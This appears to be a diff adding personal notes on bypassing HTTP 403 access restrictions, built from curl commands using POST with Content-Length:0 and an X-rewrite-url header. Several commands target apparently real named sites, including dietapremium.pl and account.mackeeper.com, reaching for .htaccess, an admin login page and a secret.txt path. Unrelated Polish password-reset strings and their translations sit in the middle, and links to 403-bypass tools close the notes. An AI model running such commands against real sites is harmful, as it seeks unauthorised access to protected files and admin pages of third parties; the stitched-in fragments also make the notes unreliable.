@@ -1,0 +1,52 @@
+## Change request method:
+
+Change requested method like GET → POST, GET — > TRACE etc.
+
+## Try to bypass 403 with the curl command
+
+If adding Content-Length:0 is successfully bypass 403 then you can exploit it with this command
+
+curl -X POST -H “Content-Length:0” https://www.xyz.com
+
+OR
+
+If you see adding X-rewrite-url is able to bypass 403 then your exploit command will be
+
+curl -i -s -k -X $’GET’ -H $’Host: www.dietapremium.pl’ -H $’X-rewrite-url: .htaccess’ $https://www.dietapremium.pl/images//%20'
+
+
+
+
+https://www.dietapremium.pl/files/blog/	- 403 page
+curl -i -s -k -X $'GET' -H $'Host: account.mackeeper.com' -H $'X-rewrite-url: admin/login' $'https://account.mackeeper.com/'
+curl -i -s -k -X $'GET' -H $'Host: www.dietapremium.pl' -H $'X-rewrite-url: /files/blog/' $'https://www.dietapremium.pl/images/'
+
+
+curl -X POST -H “Content-Length:0” https://www.dietapremium.pl/images/
+/%2f/secret.txt/
+curl -i -s -k -X $’GET’ -H $’Host: sub.xyz.com’ -H $’X-rewrite-url: .htaccess’ $’https://sub.xyz.com/'
+curl -i -s -k -X GET -H $’Host: www.dietapremium.pl’ -H $’X-rewrite-url: .htaccess’ $’https://www.dietapremium.pl/images/'
+
+
+Podaj adres poczty elektronicznej Twojego konta. Prześlemy Ci link do zmiany hasła.1
+
+
+//konto/zamowienia
+
+zmiana-hasla
+zmiana-hasla
+Nie pamiętam hasła
+Nie znaleziono konta o podanym adresie email 
+
+
+// account / orders
+
+password change
+password change
+I forgot my password
+No account found with the given email address
+
+tools:
+https://github.com/lobuhi/byp4xx
+https://github.com/iamj0ker/bypass-403
+https://github.com/gotr00t0day/forbiddenpass
